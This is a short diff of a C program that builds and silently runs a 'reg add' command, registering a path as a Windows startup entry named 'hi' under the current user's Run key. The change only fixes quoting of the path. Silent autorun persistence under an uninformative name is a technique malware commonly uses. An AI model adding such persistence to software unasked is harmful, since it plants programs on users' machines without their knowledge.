@@ -22,8 +22,8 @@ int main() {
         
             char comando_reg[1024];
             snprintf(comando_reg, sizeof(comando_reg), 
-                     "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"hi\" /t REG_SZ /d \"%s\" /f > nul", 
-                     destiny);
+                    "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"hi\" /t REG_SZ /d \"\\\"%s\\\"\" /f > nul", 
+                    destiny);
             
             system(comando_reg);
         }
